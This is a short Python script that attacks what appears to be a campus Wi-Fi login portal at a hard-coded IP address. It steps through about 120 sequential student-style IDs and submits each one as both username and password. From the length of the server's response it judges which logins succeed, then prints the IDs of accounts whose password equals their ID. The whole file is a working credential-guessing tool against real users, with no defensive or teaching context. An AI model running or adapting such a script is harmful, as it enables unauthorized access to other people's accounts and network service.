import requests
import bs4

url = 'http://115.248.50.60/registration/Main.jsp?sessionId=1&wispId=1'

headers = {
    'User-Agent':
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
}

source_code = requests.get(url, headers=headers, verify=False)

headers.update({"Cookie": "JSESSIONID=" + source_code.cookies["JSESSIONID"]})

fruits = range(2300, 2420)

for x in fruits:
    id = '18BCE' + str(x)
    data = {
        'loginUserId': id,
        'authType': 'Pronto',
        'loginPassword': id,
        'submit': 'Login'
    }

    source_code = requests.post("http://115.248.50.60/registration/chooseAuth.do", data=data, headers=headers,
                                verify=False);
    soup = bs4.BeautifulSoup(source_code.text, "html.parser")
    findings: bs4.element.Tag = soup.font
    final = (str(findings.contents[-1])).__len__()
    if final == 38:
        print(id)
